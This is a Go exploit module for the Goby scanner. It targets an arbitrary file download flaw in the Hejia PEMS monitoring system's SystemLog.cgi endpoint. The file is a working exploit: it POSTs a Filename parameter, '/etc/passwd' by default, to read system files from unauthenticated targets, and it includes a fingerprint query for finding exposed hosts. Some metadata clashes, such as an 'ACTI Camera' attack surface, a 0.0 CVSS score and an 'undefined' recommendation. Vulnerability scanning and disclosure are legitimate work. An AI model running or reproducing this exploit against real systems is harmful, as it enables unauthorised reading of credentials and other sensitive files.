package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
  "Name": "HEJIA PEMS SystemLog.cgi Arbitrary file_download",
  "Description": "Shijiazhuang Hejia Technology Co., Ltd. and Jijia Technology PEMS have arbitrary file download vulnerability, which can be used by attackers to obtain sensitive information without logging in.  ",
  "Product": "Moving loop monitoring system",
  "Homepage": "http://www.hejia-tech.com/",
  "DisclosureDate": "2021-08-27",
  "Author": "luckying1314@139.com",
  "GobyQuery": "body=\"和嘉机房动力环境监控系统\"",
  "Level": "2",
  "Impact": "<p>Arbitrary file download or read vulnerability is mainly because when the application system provides file download or read function, it directly specifies the file path in the file path parameter and does not verify the validity of the file path, so that the attacker can jump through the directory (..&nbsp; \\ or..&nbsp; /) to download or read files outside the original specified path.&nbsp; Attackers can download or read any files on the system through this vulnerability, such as database files, application system source code, password configuration information and other important sensitive information, resulting in sensitive information leakage of the system.&nbsp;&nbsp;<br></p>",
  "Recommandation": "<p>undefined</p>",
  "References": [
    "https://gobies.org/"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "File",
      "type": "input",
      "value": "/etc/passwd"
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND"
  ],
  "ExploitSteps": null,
  "Tags": [
    "File read"
  ],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": [
      "ACTI Camera"
    ],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/cgi-bin/SystemLog.cgi?loadLogContent"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
      cfg.Data = "Filename=/etc/passwd"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
        		return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "root")
        	}
        	return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
		  file := ss.Params["File"].(string)
		  uri := fmt.Sprintf("/cgi-bin/SystemLog.cgi?loadLogContent")
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
      cfg.Data = fmt.Sprintf("Filename=%s", file)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
        		expResult.Output = resp.Utf8Html
        		expResult.Success = true
        	}
			return expResult
		},
	))
}                   